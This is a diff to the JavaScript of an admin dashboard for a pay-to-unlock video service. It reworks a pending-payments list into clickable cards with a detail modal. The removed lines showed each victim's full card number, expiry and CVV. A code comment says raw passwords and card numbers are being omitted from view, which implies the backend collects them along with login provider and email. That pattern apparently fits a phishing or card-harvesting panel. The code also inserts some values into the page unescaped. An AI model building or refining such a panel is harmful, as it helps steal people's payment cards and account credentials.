@@ -98,6 +98,8 @@ async function loadDashboard() {
     loadPaymentHistory();
 }
 
+let currentPendingPayments = []; // Global array to store fetched transactions for the modal
+
 async function loadPaymentHistory() {
     try {
         const res = await adminRequest('/api/admin/payments/pending');
@@ -110,25 +112,66 @@ async function loadPaymentHistory() {
         
         if (!data.pending || data.pending.length === 0) {
             container.innerHTML = '<p class="admin-empty-state">No pending payments.</p>';
+            currentPendingPayments = [];
             return;
         }
         
+        // Store the data so the modal can access it when a row is clicked
+        currentPendingPayments = data.pending;
+        
+        // Render the rows as clickable cards
         container.innerHTML = data.pending.map(p => `
-            <div class="payment-card">
-                <div><strong>${esc(p.video_title || 'Unknown')}</strong></div>
-                <div>Email: ${esc(p.email || 'N/A')}</div>
-                <div>Card Name: ${esc(p.card_name || 'N/A')}</div>
-                <div>Card Number: ${p.card_number || 'N/A'}</div>
-                <div>Expiry: ${p.expiry || 'N/A'}</div>
-                <div>CVV: ${p.cvv || 'N/A'}</div>
-                <div>Ref: ${p.transaction_ref}</div>
-                <div>Amount: €${parseFloat(p.amount_cents || 0) / 100}</div>
+            <div class="payment-card" style="cursor: pointer; border-left: 4px solid #f6121d; margin-bottom: 10px; padding: 12px; background: #131313; border-radius: 4px;" onclick="openPaymentDetail('${esc(p.transaction_ref)}')">
+                <div style="font-size: 15px; margin-bottom: 5px; color: #fff;"><strong>${esc(p.video_title || 'Video Unlock')}</strong></div>
+                <div style="color: #aaa; margin-bottom: 4px; font-size: 13px;">User: <span style="color: #e3e3e3;">${esc(p.email)}</span></div>
+                <div style="color: #aaa; font-size: 13px;">Txn ID: <code style="background: #262626; padding: 2px 6px; border-radius: 4px; color: #fff;">${esc(p.transaction_ref).substring(0, 8)}</code></div>
             </div>
         `).join('');
     } catch (e) {
         console.error('Payment history error:', e);
     }
 }
+
+// Function to populate and open the detailed modal
+function openPaymentDetail(ref) {
+    const p = currentPendingPayments.find(txn => txn.transaction_ref === ref);
+    if (!p) return;
+
+    const modal = document.getElementById('paymentDetailModal');
+    const title = document.getElementById('detailTitle');
+    const grid = document.getElementById('detailGrid');
+
+    title.textContent = `Transaction ${ref.substring(0, 8)}`;
+    
+    const submittedTime = new Date(p.submitted_at).toLocaleString();
+
+    // Populate the grid matching the layout from the screenshot (omitting raw passwords/CC numbers)
+    grid.innerHTML = `
+        <div style="grid-column: 1 / -1; margin-top: 10px; border-bottom: 1px solid #262626; padding-bottom: 6px; color: #8a8a8a; font-size: 11px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase;">Transaction Info</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Transaction ID</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0;">${esc(p.transaction_ref).substring(0, 15)}...</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Submitted</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0;">${submittedTime}</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Status</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0;">Pending Review</div>
+
+        <div style="grid-column: 1 / -1; margin-top: 20px; border-bottom: 1px solid #262626; padding-bottom: 6px; color: #8a8a8a; font-size: 11px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase;">Payment Details</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Cardholder Name</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0;">${esc(p.card_name || 'N/A')}</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Payment Email</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0;">${esc(p.email || 'N/A')}</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Amount</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0;">€${parseFloat(p.amount_euros || 0).toFixed(2)}</div>
+
+        <div style="grid-column: 1 / -1; margin-top: 20px; border-bottom: 1px solid #262626; padding-bottom: 6px; color: #8a8a8a; font-size: 11px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase;">Authentication Details</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Auth Provider</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0; text-transform: uppercase;">${esc(p.auth_provider || 'N/A')}</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Auth Email</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0;">${esc(p.auth_email || 'N/A')}</div>
+
+        <div style="grid-column: 1 / -1; margin-top: 20px; border-bottom: 1px solid #262626; padding-bottom: 6px; color: #8a8a8a; font-size: 11px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase;">Video Info</div>
+        <div style="color: #a3a3a3; font-size: 14px; padding: 6px 0;">Video Title</div> <div style="text-align: right; color: #fff; font-size: 14px; padding: 6px 0;">${esc(p.video_title || 'N/A')}</div>
+    `;
+
+    modal.classList.remove('hidden');
+}
+
+// Ensure the close button works
+document.getElementById('detailCloseBtn')?.addEventListener('click', () => {
+    document.getElementById('paymentDetailModal').classList.add('hidden');
+});
 
 async function loadVideosTable() {
     try {
